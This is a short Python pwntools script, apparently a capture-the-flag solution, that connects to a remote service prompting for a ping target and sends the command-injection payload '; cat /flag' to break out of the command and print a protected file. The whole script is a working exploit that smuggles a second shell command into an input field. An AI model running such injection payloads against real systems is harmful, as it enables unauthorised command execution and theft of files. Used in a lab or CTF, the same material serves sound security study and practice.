from pwn import *
import sys
context.log_level = "error"
host, port = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("target", 1337)
p = remote(host, port)
p.recvuntil(b"ping: ")
p.sendline(b"; cat /flag")            # break out of the echo command
print(p.recvall(timeout=5).decode(errors="replace"))
